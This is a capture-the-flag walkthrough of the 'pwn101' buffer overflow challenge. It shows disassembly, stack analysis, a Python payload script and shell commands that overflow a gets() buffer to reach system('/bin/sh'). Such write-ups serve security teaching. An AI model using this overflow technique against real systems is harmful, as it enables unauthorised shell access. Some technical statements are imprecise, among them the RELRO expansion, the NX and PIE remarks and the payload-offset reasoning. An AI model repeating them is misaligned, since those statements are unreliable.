# PWN101 CTF Walkthrough

## Executive Summary

This is a classic buffer overflow challenge. The binary takes user input via the `gets()` function (which is vulnerable to buffer overflows), and we need to overwrite a specific value on the stack to trigger a shell command execution via `system()`.

---

## Phase 1: Reconnaissance

### 1.1 File Information

**Target Binary:** `/home/jack/Documents/hacktivities/projects/pwn ctfs/pwn101/pwn101`

**File Type Analysis:**
```
ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked
Interpreter: /lib64/ld-linux-x86-64.so.2
Not stripped (symbols available)
```

### 1.2 Security Protections Analysis

Using `checksec`:

| Protection | Status | Notes |
|-----------|--------|-------|
| **RELRO** | Full RELRO | Full Read-Only Relocation Object |
| **Stack Canary** | ❌ Not Found | **VULNERABLE** - No stack canary protection |
| **NX** | ✅ Enabled | No eXecute bit set - can't execute shellcode on stack |
| **PIE** | ✅ Enabled | Position Independent Executable - harder to predict addresses |
| **Stripped** | ❌ No | Symbols retained - easier to analyze |

**Exploitation Implications:**
- No stack canary means we can overwrite the stack without detection
- NX enabled means we need to use ROP gadgets or existing functions like `system()`
- PIE is enabled but the binary is not stripped, making analysis easier
- The absence of a canary is the key vulnerability

### 1.3 String Analysis

Key strings discovered in the binary:

```
"Hello!, I am going to shopping."
"My mom told me to buy some ingredients."
"Type the required ingredients to make briyani: "
"Nah bruh, you lied me :("
"She did Tomato rice instead of briyani :/"
"Thanks, Here's a small gift for you <3"
"/bin/sh"
```

**Interesting Functions Found:**
- `gets` - Dangerous function, vulnerable to buffer overflow
- `system` - Can execute shell commands
- `puts` - Output function
- `exit` - Exit function

---

## Phase 2: Binary Analysis

### 2.1 Main Function Disassembly

Key assembly code from `main()`:

```assembly
000000000000088e <main>:
 88e: 55                    push   %rbp
 88f: 48 89 e5              mov    %rsp,%rbp
 892: 48 83 ec 40           sub    $0x40,%rsp           # Allocate 64 bytes (0x40) on stack
 896: c7 45 fc 39 05 00 00  movl   $0x539,-0x4(%rbp)   # Store value 0x539 (1337 in decimal)
 ...
 8c9: 48 8d 45 c0           lea    -0x40(%rbp),%rax    # Load address of buffer
 8cd: 48 89 c7              mov    %rax,%rdi           # Move to RDI (first arg)
 8d0: b8 00 00 00 00        mov    $0x0,%eax
 8d5: e8 f6 fd ff ff        call   6d0 <gets@plt>      # VULNERABLE: gets() call
 ...
 8da: 81 7d fc 39 05 00 00  cmpl   $0x539,-0x4(%rbp)  # Compare value with 0x539
 8e1: 75 16                 jne    8f9 <main+0x6b>    # Jump if not equal (fail case)
 8e3: 48 8d 3d e6 02 00 00  lea    0x2e6(%rip),%rdi   # Load success string
 8ea: e8 c1 fd ff ff        call   6b0 <puts@plt>     # Print success
 8ef: bf 39 05 00 00        mov    $0x539,%edi        # Move 0x539 to EDI
 8f4: e8 f7 fd ff ff        call   6f0 <exit@plt>     # Exit with code 0x539
 ...
 8f9: 48 8d 3d 18 03 00 00  lea    0x318(%rip),%rdi   # Load failure string
 900: e8 ab fd ff ff        call   6b0 <puts@plt>     # Print failure message
 905: 48 8d 3d 33 03 00 00  lea    0x333(%rip),%rdi   # Load shell command
 90c: e8 af fd ff ff        call   6c0 <system@plt>   # EXECUTE SHELL COMMAND
 911: 90                    nop
 912: c9                    leave
 913: c3                    ret
```

### 2.2 Vulnerability Analysis

**The Key Vulnerability:**

1. At offset `-0x40` from the frame pointer, a 64-byte buffer is allocated
2. At offset `-0x4` from the frame pointer, a 4-byte integer is stored with value `0x539` (1337)
3. The program uses `gets()` to read input into the buffer without bounds checking
4. The program then compares the value at `-0x4(%rbp)` with `0x539`

**Stack Layout:**
```
[RBP + 0]     ← RBP (frame pointer)
[RBP - 0x4]   ← Check value (0x539) - 4 bytes
[RBP - 0x40]  ← Buffer start - 64 bytes
```

**The Exploit:**
- We can write more than 64 bytes into the buffer
- After 60 bytes, we'll start overwriting the check value at `[RBP - 0x4]`
- If we overwrite it with a different value, the `cmpl` will fail
- When it fails, `system()` is called with a shell command!

---

## Phase 3: Exploitation

### 3.1 Crafting the Payload

To trigger the `system()` call, we need to:

1. Fill the 64-byte buffer with junk data
2. Overwrite the 4-byte check value with anything EXCEPT `0x539`
3. Send this payload to the program

**Payload Structure:**
```
[64 bytes of junk] + [4 bytes different from 0x539]
```

### 3.2 Python Exploit

```python
#!/usr/bin/env python3
import subprocess

# Craft payload: 64 bytes of 'A' + 4 bytes of 'B' (0x42424242)
payload = b'A' * 64 + b'B' * 4

# Send payload to the binary
proc = subprocess.Popen(
    ['/home/jack/Documents/hacktivities/projects/pwn ctfs/pwn101/pwn101'],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE
)

stdout, stderr = proc.communicate(input=payload)

print("STDOUT:")
print(stdout.decode())
print("\nSTDERR:")
print(stderr.decode())
print(f"\nReturn Code: {proc.returncode}")
```

### 3.3 Expected Output

When the check fails, the program executes:
```c
system("/bin/sh");  // This spawns an interactive shell
```

The program will execute a shell command, allowing us to interact with the system.

---

## Phase 4: Flag Recovery

After exploiting the buffer overflow:

1. The `system()` call executes `/bin/sh`
2. We can run shell commands
3. Look for flag file (typically `flag.txt` or similar)
4. Use commands like: `cat flag.txt`, `ls -la`, etc.

---

## Key Learnings

| Concept | Explanation |
|---------|-------------|
| **Buffer Overflow** | Writing beyond buffer boundaries overwrites adjacent memory |
| **Stack Layout** | Understanding where variables are stored helps us target overwrites |
| **Function Calls** | `gets()` is dangerous; never use it for untrusted input |
| **Canary Absence** | Without a stack canary, we can overflow without triggering detection |
| **NX Bypass** | We used existing `system()` function instead of injecting shellcode |
| **PIE Evasion** | Even with PIE, non-stripped binaries leak function addresses in PLT |

---

## Commands Reference

```bash
# File analysis
file /path/to/binary

# Check security protections
checksec --file=/path/to/binary

# Extract strings
strings /path/to/binary

# Disassemble binary
objdump -d /path/to/binary

# Look at main function
objdump -d /path/to/binary | grep -A 50 "<main>:"

# Run binary with input
echo "payload" | /path/to/binary

# Create binary payload with Python
python3 -c "import sys; sys.stdout.buffer.write(b'A'*64 + b'B'*4)" | /path/to/binary
```

---

## Conclusion

This challenge demonstrates a classic stack-based buffer overflow vulnerability. The combination of:
- Unsafe input function (`gets()`)
- No stack canary protection
- Accessible `system()` function

...creates a straightforward path to arbitrary code execution. This type of vulnerability was common before modern protections were implemented, but understanding it is crucial for binary exploitation fundamentals.
